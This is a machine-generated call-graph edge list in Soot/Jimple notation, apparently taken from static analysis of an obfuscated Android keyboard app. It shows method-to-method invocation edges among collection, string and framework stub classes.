VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <lki: void <init>(java.lang.Object,java.lang.Object)> ==> <lid: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int max(int,int)>($i2, $i0) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int max(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkx: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null key in entry: null=") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<mly: java.lang.IllegalArgumentException f()>() in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" and ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iye: void y(boolean,java.lang.Object)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>(int)>($i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object k(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int c()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $i0 = virtualinvoke $r7.<lsm: int a(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: int a(lsz)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljd: int b()> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void t(int)>($i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void t(int)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljf: boolean add(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r3, $r8) in <lqs: boolean equals(java.lang.Object)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i3 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i2) in <ljd: int f(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $i9 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljd: java.lang.Object j()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.NoSuchElementException: void <init>()>() in <lsb: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
SPECIAL edge: specialinvoke $r15.<lme: void <init>(lkx,int)>($r12, $i0) in <lmb: lme f()> ==> <lme: void <init>(lkx,int)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>()> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set f()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set f()>
SPECIAL edge: specialinvoke $r5.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_METADATA", 5, 5) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqp: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lql: void <init>(java.lang.Object[],int)> ==> <lkq: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lqp: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(9) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r0 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $i6 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.WeakHashMap: void <init>()>() in <gwk: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int f(java.lang.Object)>($r2) in <ljb: void a()> ==> <ljd: int f(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lmc: void <init>(lme)>(r0) in <lme: lma c()> ==> <lmc: void <init>(lme)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map n(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.util.Map n(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int c()>() in <liz: void <init>(ljd)> ==> <ljd: int c()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int highestOneBit(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r6.<lrg: void <init>(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lrg: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lje: void <init>(ljf)>(r0) in <ljf: java.util.Iterator iterator()> ==> <lje: void <init>(ljf)>
SPECIAL edge: specialinvoke $r28.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <ltr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltr: void <clinit>()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object e(int)> ==> <ljf: java.lang.Object[] s()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <lvq: void <init>(lvr,int)> ==> <java.util.AbstractSet: void <init>()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <izw: java.lang.Object al(int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqr: lkq f()>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int n(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: int n(int)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <liy: int size()>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lqr: lkq f()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractCollection: void <init>()>() in <lkh: void <init>()> ==> <java.util.AbstractCollection: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(3) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>($r2, $r3) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <j$.sun.misc.b: java.lang.reflect.Field i()>() in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: java.lang.reflect.Field i()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i1) in <lkg: int a(int,int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>($r2, $i0, $i1, $r3) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>
STATIC edge: $r1 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <lvr: int hashCode()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int j()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lkq: boolean isEmpty()>() in <lkq: lsb C(int)> ==> <java.util.AbstractCollection: boolean isEmpty()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int j()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>() in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: java.lang.Object get(int)>($i2) in <lkq: int hashCode()> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r8, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lig: void <init>()>() in <lim: void <init>()> ==> <lig: void <init>()>
STATIC edge: $r1 = staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>("line.separator") in <lwe: void <clinit>()> ==> <java.lang.System: java.lang.String getProperty(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" threw ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <llg: java.lang.Object next()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lrg: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <ljf: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(char[],char[])>($r12, $r13) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(char[],char[])>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.c: void <init>(long)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "message") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: int o(int,int,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r7 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>("com.google.common.base.Strings") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqp: java.lang.Object get(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<hnq: void <init>()>() in <hnt: void <clinit>()> ==> <hnq: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb C(int)>(0) in <lkq: lsb B()> ==> <lkq: lsb C(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <mly: java.lang.IllegalArgumentException f()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lvs: void <init>(java.lang.String,int)>("BOOLEAN", 0) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <izw: java.lang.Object[] S(java.lang.Iterable)>($r1) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <izw: java.lang.Object[] S(java.lang.Iterable)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.lang.Object h(int)>($i0) in <ljb: void <init>(ljd,int)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(byte[],byte)>($r4, -1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(byte[],byte)>
CLINIT edge: staticinvoke <ljs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljs: void <clinit>()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(int[],int)>($r8, $i1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(int[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
STATIC edge: staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lly: void j(java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lma: void <init>()> ==> <lkh: void <init>()>
